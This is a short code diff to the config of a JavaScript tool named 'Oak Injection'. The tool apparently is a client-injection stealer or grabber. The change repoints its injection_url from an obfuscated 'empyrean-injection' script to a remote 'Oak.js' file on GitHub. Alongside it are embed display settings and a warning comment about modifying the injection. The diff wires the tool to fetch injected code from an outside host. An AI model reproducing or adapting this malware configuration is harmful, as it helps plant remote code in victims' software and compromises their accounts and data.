@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Oak Injection', 
   embed_icon: 'https://i.imgur.com/bbWgtHI.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/j0taro/Oak-injection/main/Oak.js', 
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
